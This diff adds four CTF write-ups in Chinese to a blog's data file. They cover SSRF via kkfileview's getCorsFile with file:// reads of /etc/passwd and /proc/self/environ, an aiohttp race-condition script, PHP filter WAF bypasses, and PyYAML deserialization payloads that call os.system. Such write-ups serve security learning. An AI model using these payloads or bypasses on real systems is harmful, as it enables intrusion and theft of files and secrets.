@@ -1102,5 +1102,232 @@ session["user_id"] = final_user.id  # ← 攻击者控制登录谁
 *生成时间: 2026-05-06*
 *博客地址: https://qiuyida.github.io/ctf-writeup-blog/*
 `
-  }
+  },
+  northbridge: {
+    title: 'Northbridge — SSRF Bypass',
+    subtitle: 'SSRF via kkfileview getCorsFile',
+    content: `
+Northbridge 是一道典型的 SSRF 题。服务端集成了 kkfileview，其中 getCorsFile 接口直接读取用户提供的 URL 并返回内容，没有任何白名单校验。
+
+## 漏洞点
+
+\`\`\`javascript
+GET /kkfileview/getCorsFile?urlPath=http://target/service
+\`\`\`
+
+\`urlPath\` 完全可控，可以指向内网服务或本地文件。
+
+## 协议探测
+
+枚举了多种协议和地址格式：
+
+| 类型 | 示例 | 结果 |
+|------|------|------|
+| HTTP 127.0.0.1 | http://127.0.0.1:8080 | 被拦截 |
+| file:// | file:///etc/passwd | 成功 |
+| gopher:// | gopher://127.0.0.1:6379/_info | 超时 |
+| 大小写变体 | http://127.0.0.1 | 失败 |
+| Decimal IP | http://2130706433 | 失败 |
+
+**关键发现：file:// 直接读本地文件最有效。**
+
+## 读取 flag
+
+\`\`\`bash
+file:///flag
+file:///app/index.php
+file:///proc/self/environ
+\`\`\`
+
+从 /proc/self/environ 中发现了环境变量泄露，包含部分 flag。
+
+## 内网横向
+
+当白名单只允许访问特定域名时：
+
+1. **@ 陷阱**：http://evil@127.0.0.1 有时被解析为攻击目标
+2. **# 片段**：http://127.0.0.1#evil.com 可绕过域名校验
+3. **302 跳转**：让目标服务器请求可控的跳转地址
+
+## 收获的 flag
+
+题目分散在多个文件：
+- 直接文件读取：/flag, /flag.txt
+- 源码泄露：/app/*.php, /.git/config
+- 运行环境：/proc/self/*, /proc/version
+- 临时文件：/tmp/*, /var/log/*
+
+## 踩坑
+
+1. **一开始死磕 HTTP 协议**，浪费了很多时间在 IP 黑名单绕过上
+2. **file:// 的多重路径**：/flag 不存在时试试 /app/flag、/var/www/flag
+`
+  },
+  qc734: {
+    title: 'QingCen #734 — Race Condition',
+    subtitle: 'aiohttp 并发刷积分',
+    icon: 'Zap',
+    color: 'orange',
+    desc: '竞态条件, 并发兑换, 积分商城',
+    content: `
+# QingCen #734 — Race Condition
+
+**靶场**: docker.qingcen.net:30053
+**类型**: Web / 条件竞争
+**难度**: Medium
+
+## 漏洞分析
+
+积分商城的兑换接口存在经典的 **TOCTOU** 漏洞：服务端先检查余额再扣减，但两个操作之间没有锁。高并发下多个请求可以同时通过余额检查。
+
+## 利用方式
+
+使用 **aiohttp** 异步 HTTP 客户端，单次发起数千个并发请求：
+
+\`\`\`python
+import asyncio, aiohttp
+
+async def redeem(session):
+    try:
+        async with session.post(f'{base}/api/redeem') as r:
+            return await r.json()
+    except:
+        return {}
+
+# 策略：3000并发/轮，循环刷到10000分
+connector = aiohttp.TCPConnector(limit=0)
+async with aiohttp.ClientSession(connector=connector) as s:
+    tasks = [redeem(s) for _ in range(3000)]
+    results = await asyncio.gather(*tasks)
+\`\`\`
+
+## 踩坑
+
+1. **一开始只用了 threads**，实际 aiohttp 异步比多线程更高效
+2. **没检查返回值格式**，有的返回 200 但内容是 error，需要判 code == 200
+3. **session 会过期**：刷到一定程度 session 被限制，需要重新 GET 首页刷新 cookie
+`
+  },
+  qc747: {
+    title: 'QingCen #747 — PHP Filter Bypass',
+    subtitle: '大小写绕过 + URL编码',
+    icon: 'Code',
+    color: 'purple',
+    desc: 'PHP WAF 绕过, 编码技巧, 源码分析',
+    content: `
+# QingCen #747 — PHP Filter Bypass
+
+**靶场**: docker.qingcen.net:38073
+**类型**: Web / PHP Filter Bypass
+**难度**: Medium
+
+## WAF 规则
+
+题目对文件包含参数做了多重过滤：
+
+| 过滤词 | 触发信息 | 绕过方法 |
+|--------|----------|----------|
+| php | "php not allowed" | 大写 PHP / Php / pHp |
+| data | "data not allowed" | URL 编码 %64ata → data |
+| flag | "file not allowed" | 编码单字符 %66lag → flag |
+| :// | "file not allowed" | 部分编码不可行，改用其他 wrapper |
+
+## 绕过过程
+
+### 1. 大小写绕过 php
+
+\`\`\`bash
+PHP://filter/convert.base64-encode/resource=pages/flag.html
+\`\`\`
+
+WAF 只匹配小写 "php"，大写完全放行。
+
+### 2. URL 编码绕过 flag
+
+\`\`\`bash
+# 逐字节编码
+%66lag.html → flag.html
+fla%67.html → flag.html
+fl%61g.html → flag.html
+%66%6c%61%67.html → flag.html
+\`\`\`
+
+### 3. 读取源码确认路径
+
+先用 filter 读 index.php 确认文件结构：
+
+\`\`\`bash
+PHP://filter/convert.base64-encode/resource=index.php
+\`\`\`
+
+从代码中确认 flag 文件路径是 pages/flag.html。
+
+## 关键 Payload
+
+\`\`\`bash
+PHP://filter/convert.base64-encode/resource=pages/%66%6c%61%67.html
+# Base64 解码得到 flag.html 内容
+\`\`\`
+
+## 经验
+
+PHP filter 绕过常见技巧：
+1. **大小写变体**：PHP → Php → pHp → phP
+2. **URL 编码**：单字节编码比双字节更隐蔽
+3. **读源码**：先读 index.php，再定向攻击，比盲猜快 10 倍
+`
+  },
+  yaml: {
+    title: '喵喵宠物医院 — YAML 反序列化 RCE',
+    subtitle: 'PyYAML 标签绕过',
+    icon: 'Zap',
+    color: 'orange',
+    desc: 'YAML deserialization, 命令执行, 标签绕过',
+    content: `
+# 喵喵宠物医院 — YAML 反序列化 RCE
+
+**靶场**: 175.27.251.122:10001
+**类型**: Misc / Insecure Deserialization
+**难度**: Medium
+
+## 题目逻辑
+
+服务端提供一个"终端"功能，接受 JSON 请求并通过 PyYAML 解析命令内容。PyYAML 的 unsafe load 会实例化任意 Python 对象。
+
+## 漏洞点
+
+\`\`\`python
+# 危险代码
+yaml.load(user_input)  # 未指定 Loader
+\`\`\`
+
+## 利用 Payload
+
+PyYAML 支持多种构造方式：
+
+\`\`\`yaml
+# 方式1：直接调用系统命令
+!!python/object/apply:os.system
+args: ['cat /flag']
+
+# 方式2：环境变量读取
+!!python/object/apply:os.environ.get
+args: ['FLAG']
+\`\`\`
+
+## 多端口排查
+
+三个端口分别对应不同安全等级：
+- **10001**: 过滤了常见的 !!python/object/apply
+- **10002**: 部分过滤
+- **10003**: 直接可执行
+
+脚本优先测 10003，因为最不严格。
+
+## 踩坑
+
+1. **载荷格式**：JSON 转义后 YAML 多行 payload 需要正确换行
+2. **编码**：脚本里加 sys.stdout.reconfigure(encoding='utf-8') 解决中文/特殊字符输出
+`
+  },
 }
